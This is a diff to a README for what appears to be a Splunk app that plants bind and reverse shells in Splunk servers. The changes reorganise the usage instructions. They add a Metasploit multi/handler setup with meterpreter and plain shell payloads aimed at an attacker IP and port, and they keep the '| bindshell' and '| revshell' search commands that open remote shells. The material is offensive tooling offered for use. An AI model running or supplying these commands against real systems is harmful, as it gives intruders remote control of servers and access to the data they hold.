@@ -32,13 +32,22 @@ Once Splunk is restarted click on Permissions for the splunk_shells app. Ensure 
 # Usage
 Using each of these shells can be done from the Search and Reporting app. Setup a handler first then execute one of the following searches:
 
-## Bind Shell
+## Setup Metasploit Handler
 
 use multi/handler<br>
+
+Pick one of the below
+
+set payload python/meterpreter_reverse_tcp<br>
 set payload python/meterpreter_bind_tcp<br>
+set payload python/shell_reverse_tcp<br>
+set payload python/shell_bind_tcp<br>
+
 set LHOST <ATTACKER IP><br>
 set LPORT <ATTCKER PORT><br>
 exploit -j<br>
+
+## Bind Shell
 
 '| bindshell SHELLTYPE PORTNUMBER' 
 
@@ -48,12 +57,6 @@ PORTNUMBER - Specify the port you want the bind shell to listen on. If you do no
 
 
 ## Reverse Shell
-
-use multi/handler<br>
-set payload python/meterpreter_reverse_tcp<br>
-set LHOST <ATTACKER IP><br>
-set LPORT <ATTCKER PORT><br>
-exploit -j<br>
 
 '| revshell SHELLTYPE ATTACKERIP ATTACKERPORT'
 
